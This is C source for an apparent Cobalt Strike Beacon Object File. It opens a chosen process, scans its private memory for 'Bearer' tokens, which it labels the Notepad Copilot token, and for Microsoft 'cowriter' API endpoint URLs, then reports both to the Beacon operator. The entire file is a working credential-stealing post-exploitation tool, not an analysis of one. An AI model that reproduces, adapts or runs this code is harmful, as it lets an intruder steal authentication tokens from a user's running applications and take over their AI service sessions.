#include <windows.h>
#include "bofdefs.h"
#include "base.c"

//  Forward declarations:
BOOL GetProcessList( int pid );
void Write_Memory_Range( HANDLE hProcess, LPCVOID address, size_t address_sz);
void GetProcessMemory( HANDLE hProcess );

typedef BOOL (*myReadProcessMemory)(
    HANDLE hProcess,
    LPCVOID lpBaseAddress,
    LPVOID lpBuffer,
    size_t nSize,
    size_t *lpNumberOfBytesRead
);

typedef size_t(*myVirtualQueryEx)(
    HANDLE hProcess,
    LPCVOID lpAddress,
    PMEMORY_BASIC_INFORMATION lpBuffer,
    size_t dwLength
);

typedef struct _MEMORY_INFO 
{
    LPVOID offset;
    unsigned long long size;
    DWORD state;
    DWORD protect;
    DWORD type;
} MEMORY_INFO, *PMEMORY_INFO;

BOOL GetProcessList( int pid )
{
  HANDLE hProcess;
  hProcess = KERNEL32$OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid);
  if( hProcess == NULL )
     { 
    BeaconPrintf(CALLBACK_ERROR, "OpenProcess Failed");
    return(FALSE);
  } 

  GetProcessMemory(hProcess);
  KERNEL32$CloseHandle( hProcess );
    
  return( TRUE );
}

void Write_Memory_Range( HANDLE hProcess, LPCVOID address, size_t address_sz)
{
    myReadProcessMemory ptr_ReadProcessMemory = NULL;
    BOOL rc = FALSE;
    BOOL rc2 = FALSE;
    size_t bytesRead = 0;
    wchar_t *buffer = {0};
    wchar_t *buffer2 = {0};
    int index = 0;
    int index2 = 0;
    int ret_sz = 1;

    HMODULE KERNEL32 = LoadLibraryA("kernel32");
    if( KERNEL32 == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to load ws2 lib");
        return;
    }
    ptr_ReadProcessMemory = (myReadProcessMemory)GetProcAddress(KERNEL32, "ReadProcessMemory");
    if(!ptr_ReadProcessMemory )
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not load functions");
        goto END;
    }

    buffer = intAlloc(address_sz+0x100);
    buffer2 = intAlloc(address_sz+0x100);

    if (buffer == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory");
        goto END;
    }

    rc = ptr_ReadProcessMemory( hProcess, address, (char*)buffer, address_sz, &bytesRead );
    if (rc == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "\nReadProcessMemory failed\n");
        BeaconPrintf(CALLBACK_ERROR, "Bytes Read %d\n", bytesRead);
        BeaconPrintf(CALLBACK_ERROR, "\n\n\n %s\n\n\n", buffer );
        return;
    }else{
    for (index = 0; index < (address_sz/2)-8; index++)
    {
        //if(buffer[index] == L'e' && buffer[index+1] == L'y' && buffer[index+2] == L'J' && buffer[index+3] == L'0' && buffer[index+4] == L'e' && buffer[index+5] == L'X')
        if (buffer[index] == L'B' && buffer [index+1] == L'e' && buffer[index+2] == L'a' && buffer[index+3] == L'r' && buffer[index+4] == L'e' && buffer[index+5] == L'r')
        {
            BeaconPrintf(CALLBACK_OUTPUT, "notepad copilot token: %ls", buffer + index);
            index += MSVCRT$wcslen(buffer + index);
      //      continue;
        }
    }
  }



   rc2 = ptr_ReadProcessMemory( hProcess, address, (char*)buffer2, address_sz, &bytesRead );

    if (rc2 == 0)
  {

   BeaconPrintf(CALLBACK_ERROR, "failed %s", buffer2);
    return;

  }else {

    for (index2 = 0; index2 < (address_sz/2)-8; index2++)
    {
        if (buffer2[index2] == L'h' && buffer2[index2+1] == L't' && buffer2[index2+2] == L't' &&
            buffer2[index2+3] == L'p' && buffer2[index2+4] == L's' && buffer2[index2+5] == L':' &&
            buffer2[index2+6] == L'/' && buffer2[index2+7] == L'/')
        {
            wchar_t* current = buffer2 + index2;
            if (MSVCRT$wcsstr(current, L"apsaiservices.microsoft.com"))
            {
                if (MSVCRT$wcsstr(current, L"cowriter"))
                {
                    BeaconPrintf(CALLBACK_OUTPUT, "API endpoint: %ls", current);
                    while (index < (address_sz/2)-1 &&
                           buffer2[index2] != L'\0' &&
                           buffer2[index2] != L'\n' &&
                           buffer2[index2] != L'\r' &&
                           buffer2[index2] != L' ')
                    {
                        index2++;
                    }
                }
            }
        }
    }
  }
END:
    intFree(buffer);
  intFree(buffer2);
}

void GetProcessMemory( HANDLE hProcess )
{
    LPVOID lpAddress = 0;
    MEMORY_BASIC_INFORMATION lpBuffer = {0};
    size_t VQ_sz = 0;
    myVirtualQueryEx ptr_VirtualQueryEx = NULL;

    if( hProcess == 0 )
    {
        BeaconPrintf(CALLBACK_ERROR, "No Process Handle\n");
        goto END;
    }   

    HMODULE KERNEL32 = LoadLibraryA("kernel32");
    if( KERNEL32 == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to load ws2 lib");
        goto END;
    }

    ptr_VirtualQueryEx = (myVirtualQueryEx)GetProcAddress(KERNEL32, "VirtualQueryEx");
    if(!ptr_VirtualQueryEx)
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not load functions");
        goto END;
    }

    do
    {
        PMEMORY_INFO mem_info = intAlloc(sizeof(MEMORY_INFO));
        if (mem_info == NULL)
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory");
            goto END;
        }
        MSVCRT$memset(mem_info, 0, sizeof(MEMORY_INFO));
        VQ_sz = ptr_VirtualQueryEx(hProcess, lpAddress, &lpBuffer, 0x30);
        if( VQ_sz == 0x30 )
        {
            if(lpBuffer.State == MEM_COMMIT || lpBuffer.State == MEM_RESERVE) 
            {
                mem_info->offset = lpAddress;
                mem_info->size = lpBuffer.RegionSize;
                mem_info->state = lpBuffer.State;
                mem_info->type = lpBuffer.Type;
                mem_info->protect = lpBuffer.Protect;
            }else if( lpBuffer.State == MEM_FREE)
            {
                mem_info->offset = lpAddress;
                mem_info->size = lpBuffer.RegionSize;
                mem_info->state = lpBuffer.State;
                mem_info->type = lpBuffer.Type;
                mem_info->protect = lpBuffer.Protect;
            }    
        }else if (VQ_sz == 0)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "End of memory\n");
            goto END;
        }   
        lpAddress = lpAddress + mem_info->size;
        if( mem_info->protect == PAGE_READWRITE && mem_info->type == MEM_PRIVATE)
            Write_Memory_Range( hProcess, mem_info->offset, mem_info->size);
        intFree( mem_info );
    } while(1);
END:
    return;
}

#ifdef BOF
VOID go( 
    IN PCHAR Buffer, 
    IN ULONG Length 
) 
{
      int pid = 0;
    if(!bofstart())
    {
        return;
    }

    datap parser = {0};
    BeaconDataParse(&parser, Buffer, Length);
    pid = BeaconDataInt(&parser); //it might not work with inline-execution

    BeaconPrintf(CALLBACK_OUTPUT, "[+]Searching only for the following PID %d\n", pid);
    GetProcessList( pid );

    printoutput(TRUE);
    bofstop();
};

#else

int main( int argc, char* argv[])
{
//code for standalone exe for scanbuild / leak checks
    int pid = 0;
    if (argc > 1)
    {
      pid = atoi(argv[1]); 
      BeaconPrintf(CALLBACK_OUTPUT, "[+]Searching only for the following PID %d\n", pid);
    }
    GetProcessList( pid );
    return 0;
}

#endif
